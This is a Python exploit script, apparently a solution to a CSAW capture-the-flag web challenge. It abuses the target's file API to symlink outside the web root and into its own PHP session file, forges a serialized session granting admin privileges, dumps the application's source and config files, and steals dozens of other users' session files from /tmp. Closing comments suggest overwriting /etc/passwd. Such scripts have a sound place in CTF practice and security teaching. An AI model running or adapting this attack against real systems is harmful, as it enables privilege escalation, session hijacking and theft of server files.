import requests
import sys
import json

r = requests.Session()
api="http://web.chal.csaw.io:8007/"

# Register
data={"username":"1gimme", "password":"justgimme"}
r1 = r.post(api+"register", data=data)

# Login
r1 = r.post(api+"login", data=data)
print r1.text
print "Logged In"

# Try upload file

#path=1.txt&content=VTJGc2RHVmtYMTlnS2NJSmJYb1NOdVNGcUNaN2xkc0tpendLcWJpcUNYMD0%3D

r1 = r.post(api+"api/v1/file/edit", data={"path":"1.txt","content":"VTJGc2RHVmtYMTlnS2NJSmJYb1NOdVNGcUNaN2xkc0tpendLcWJpcUNYMD0="})
if "ok" in r1.text:
	print "Uploading Phase successful"

# Symlink
r1 = r.post(api+"api/v1/file/symlink", data={"path":"root", "target":"../../../../"})
if "ok" in r1.text:
	print "Symlinked Successfully"

mycookie = r.cookies.get_dict()
sess_id= mycookie['PHPSESSID']
print "Targeting the following: "+sess_id

# symlink PHPSessID in cookies
r1 = r.post(api+"api/v1/file/symlink", data={"path":"lolz1", "target":"../../../../tmp/sess_"+sess_id})
if "ok" in r1.text:
	print "Symlinked Session"

# Confirming symlink
r1 = r.post(api+"api/v1/file/read", data={"path":"lolz1"})
if "current" in r1.text:
	print r1.text

# Overwriting session to admin privileges
print "Trying to become admin by overwriting session"
data={'path':'lolz1','content':'current_user|O:4:"User":4:{s:8:"username";s:6:"1gimme";s:8:"password";s:60:"$2y$10$7yTM7zCT9nqMI8bkC2XMaejyfGfP/IIijDTmQgsOlyHizP2m/eli2";s:5:"privs";s:2:"15";s:2:"id";s:2:"17";}'}
r1 = r.post(api+"api/v1/file/edit", data=data)
print r1.text
print "Now you are admin, dont run script again, just use this session id for further test "+sess_id

# Confirming that we are now admin
r1 = r.post(api+"api/v1/file/read", data={"path":"lolz1"})
print r1.text

# Dumping files
files_to_dump = ["index.php","config.php","helpers.php","models.php","router.php","views/admin.php","views/api.php","views/auth.php","views/frontend.php","db.php","template/admin_user.php", "template/admin.php"]

for f in files_to_dump:
	r1 = r.post(api+"api/v1/file/read",data={"path":"root/var/www/html/"+f})
	xx = r1.text
	with open('./'+f,'w') as f:
		f.write(xx)
		f.close()
print "Dumped chosen files - kek"

r1 = r.post(api+"api/v1/file/list",data={"path":"root/tmp/"})
xxx = r1.text
with open('./shilled','w') as f:
	f.write(xxx)
	f.close()

sess_shit=["sess_0cnb82p0r2pugcsrpq1tnis250",
      "sess_0psrjopgi9jje0ii1e7i4cods5",
      "sess_22uestr6f10l6tfujsf3jiql34",
      "sess_2per7ja39kvb42rlbinhm52sn6",
      "sess_3jk49do8b47l772bq41qdje3e4",
      "sess_3l41393jmge28h9kc0j26c6qo2",
      "sess_41084jgflsgtcqod3vl72bsls6",
      "sess_46vl33vbbsd9l5jvuotdsghei7",
      "sess_4umud1lupqn0mpibor27r283o1",
      "sess_6vdk5kfgj7qbjim1lsc9rnc7i4",
      "sess_7c1gjjrin9qkepgetc6dpcma96",
      "sess_8b51da9vo0d6fp3ilsec38qp56",
      "sess_97sdehv49gg9e0gjbu2qbufbn3",
      "sess_9b1qk9akretiftnmgcjhstv5a5",
      "sess_9cgoath29nmjfb63eajeo7jrc5",
      "sess_aduc9st7k64mcbg1m4jt7js7d2",
      "sess_aslfv0e6t52vjjap0vdo9m7el6",
      "sess_be0jl37667p4iujr30plp9kfb4",
      "sess_bu50ejtoafjem6b8f5jbu3j1c5",
      "sess_clhhalf7jp4m2pmific2h8f253",
      "sess_d0knpctfljabb8mrgq867k4pg3",
      "sess_d43qpp388a77p1g7dobvurq8k2",
      "sess_dkj5vga5bpopin5d85re7nj620",
      "sess_en6nq9r2f0jeslfiecsvjm0hj7",
      "sess_ett0vl29osnibnh1v7v6bg5jh5",
      "sess_f9forksldvf871o6afv55ep1b5",
      "sess_fpuok37lhr36kp0s7lr14cb254",
      "sess_h40uboqe523lkc1lf8ep40bs46",
      "sess_ip6a43lstl12csjrivibvrdhm7",
      "sess_iu7091qqg485tc2jmkr2n748d2",
      "sess_j7k2a0iadhjesu6st2eede7q93",
      "sess_jn8tg2rsqno8bkb98c4a1avto4",
      "sess_k77q16100036kg3dqma4cbm3g0",
      "sess_kcribl8ma0dujq0scvmicnqqb7",
      "sess_l0d1gnslpu2b3efps4c8p642v1",
      "sess_lfa43ndpalqvp8hm3skinm1k87",
      "sess_ltrfaor6a14m3jmr0akfrm7ms1",
      "sess_mmqcs9286tcnlk04ru17flo7l2",
      "sess_n52mfhl3joeetnfluhlcl6f6k5",
      "sess_nkp9tsjrmu96uufn2gj6f1jsd3",
      "sess_ocnvv908bkqaf32o139e4cg341",
      "sess_omhr86p186fmh17dc0quhltf95",
      "sess_opd2m1ag5idkgtjoh8g1o932t3",
      "sess_or0pse2p0muvqvuotbijkotg33",
      "sess_p1t920kmc75kkjphkud1h5t841",
      "sess_ppb9rhd3np7ejamtm8sm4034f1",
      "sess_ps53o3c6s6hfkm8j5t67l7anl1",
      "sess_qch6jn0tolrf5ht64qrqc6cia7",
      "sess_qdckgggdr78p5sge6sasrbg1v6",
      "sess_r1h3lr4vv2iqpjtk9kqrn3k4k2",
      "sess_rjip1uagssvga74vi73e7r7pm6",
      "sess_rsk9drf12l03ro0roe2hrl49i2",
      "sess_sess_0psrjopgi9jje0ii1e7i4cods5",
      "sess_sess_22uestr6f10l6tfujsf3jiql34",
      "sess_sess_3jk49do8b47l772bq41qdje3e4",
      "sess_sess_4umud1lupqn0mpibor27r283o1",
      "sess_sess_6vdk5kfgj7qbjim1lsc9rnc7i4",
      "sess_sess_7c1gjjrin9qkepgetc6dpcma96",
      "sess_sess_aduc9st7k64mcbg1m4jt7js7d2",
      "sess_sess_aslfv0e6t52vjjap0vdo9m7el6",
      "sess_sess_be0jl37667p4iujr30plp9kfb4",
      "sess_sess_bu50ejtoafjem6b8f5jbu3j1c5",
      "sess_sess_dkj5vga5bpopin5d85re7nj620",
      "sess_sess_en6nq9r2f0jeslfiecsvjm0hj7",
      "sess_sess_ett0vl29osnibnh1v7v6bg5jh5",
      "sess_sess_ip6a43lstl12csjrivibvrdhm7",
      "sess_sess_jn8tg2rsqno8bkb98c4a1avto4",
      "sess_sess_l0d1gnslpu2b3efps4c8p642v1",
      "sess_sess_mmqcs9286tcnlk04ru17flo7l2",
      "sess_sess_n52mfhl3joeetnfluhlcl6f6k5",
      "sess_sess_ocnvv908bkqaf32o139e4cg341",
      "sess_sess_omhr86p186fmh17dc0quhltf95",
      "sess_sess_ppb9rhd3np7ejamtm8sm4034f1",
      "sess_sess_thdgfa1977t39as4sucjbc9r71",
      "sess_srjlbmcgo49v4rhr748orre9q1",
      "sess_t0821rn882vfofg24irip8gp00",
      "sess_thdgfa1977t39as4sucjbc9r71",
      "sess_tt04fosuntn3f9coriutsmc370",
      "sess_ubcp23c35krb5to80rj8i1cpt7",
      "sess_uqu5ngji1lrs6qg6roqn2626b3",
      "sess_utjfb75chp0ck706pi6k881u11",
      "sess_utl2i92c1fmnodl105o97c85l2",
      "sess_v3kerv2k07c7ci0h3l18vfcbp1",
      "sess_vak7ufr6lhl1isc5sosopv48c3",
      "sess_vjq5n9stngchue1id4bgbs2723"]

for s in sess_shit:
	r1 = r.post(api+"api/v1/file/read",data={"path":"root/tmp/"+s})
	xx = r1.text
	with open('./'+s,'w') as f:
		f.write(xx)
		f.close()
print "Dumped session files - kek"



# Now we can also
# edit files
#POST /api/v1/file/edit
#path=root/etc/passwd&content=lulz

# list dirs
#POST /api/v1/file/list
#path=root/<WHATEVER>
